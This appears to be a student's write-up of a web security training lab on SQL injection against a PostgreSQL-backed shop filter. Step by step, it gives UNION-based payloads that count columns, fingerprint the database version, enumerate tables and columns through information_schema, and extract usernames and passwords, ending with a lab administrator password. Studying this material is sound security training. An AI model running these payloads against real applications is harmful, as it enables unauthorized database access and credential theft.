# SQL injection attack, listing the database contents on non-Oracle databases

1. SQLi: product category filter.
    - The application has a login function.
    - The database contains a table that holds usernames and passwords.
2. Goal: 
    - Determine the name of this table and the columns it contains.
    - Retrieve the contents of the table to obtain the username and password of all users.
    - log in as the `administrator` user.

### Analysis
- Website target: `https://0a010055037a8e608001ee1c009c0093.web-security-academy.net/filter?category=Gifts`
- Use Burp suite.
- `ctrl + u`: URL encode.

1. Find the number of columns.
```sql
' order by 2--
'-- I found 2 columns.
```

2. Find the data type of columns.
```sql
' union select 'a', 'a'--
'-- Both of columns are text.
```

3. Find the version of database.
```sql
SELECT @@version --Microsoft
' union select @@version, null--
'-- Internal Server Error: not microsoft.

SELECT version() --PostgreSQL
' union select version(), null--
'-- The version of database is postgreSQL.
```

4. Output the list of table names in the database.
```sql
SELECT * FROM information_schema.tables --PostgreSQL
' union select table_name, null from information_schema.tables--
'-- I found users_zxhgqj table.
```

5. Output the column names of the table.
```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
' Union SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users_zxhgqj'--
'-- I found database name: username_txbsgp, password_hnrhnm.
```

6. Output the usernmae and password.
```sql
' union select username_txbsgp, password_hnrhnm from users_zxhgqj--
'-- Username: administrator and password: a2ttiwmu91cggf7k1hnu
```